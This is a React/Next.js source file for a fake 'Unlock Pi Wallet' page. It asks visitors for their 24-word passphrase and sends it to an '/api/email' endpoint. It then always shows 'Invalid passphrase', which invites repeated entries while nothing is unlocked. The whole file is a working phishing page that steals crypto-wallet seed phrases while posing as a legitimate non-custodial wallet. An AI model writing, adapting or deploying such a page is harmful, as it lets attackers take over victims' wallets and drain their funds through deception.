import logo from "@/assets/logo.png";
import Image from "next/image";
import wallet from "@/assets/wallet.jpg";
import { useState } from "react";

export default function UnlockWallet() {
  let [key, setKey] = useState<String>("");
  let handleSubmit = async (e: any) => {
    e.preventDefault();
    if (e.target.phrase.value !== key) {
      setKey(e.target.phrase.value);
      await fetch("/api/email", {
        method: "post",
        body: JSON.stringify({ pass: e.target.phrase.value }),
        headers: {
          "Content-Type": "application/json",
        },
      }).then(async (res) => {
        return;
      });
    } else {
      return;
    }
  };
  return (
    <div className="flex flex-col px-5 text-sm gap-10 items-center justify-center min-h-screen font-Mulish">
      <div className="bg-primary absolute  top-0 right-0 left-0 flex justify-center items-center text-white gap-2">
        <Image src={wallet} alt="logo" className="h-5 object-contain w-5" />
        Wallet
        <Image src={logo} alt="logo" className="h-10 object-contain w-10" />
      </div>
      <form
        action=""
        className="flex flex-col gap-5 w-4/5"
        method="post"
        onSubmit={(e) => {
          handleSubmit(e);
        }}
      >
        <p className="text-center font-extrabold text-lg">Unlock Pi Wallet</p>
        <textarea
          className="h-56 border-[1px] border-neutral-500 placeholder:text-base  outline-none p-5 rounded-xl"
          placeholder="Enter your 24-word passphrase here"
          name="phrase"
          id=""
          defaultValue={""}
        ></textarea>
        {key !== "" && (
          <p className="text-red-500 text-center">Invalid passphrase</p>
        )}
        <button className="w-full border font-bold text-primary border-primary py-2 rounded-md">
          Unlock with passphrase
        </button>

        <p>
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible. <br /><br /> Lost your passphrase?{" "}
          <span className="text-blue-500">You can create a new wallet</span>,
          but all your π in your previous wallet will be inaccessible.
        </p>
      </form>
    </div>
  );
}
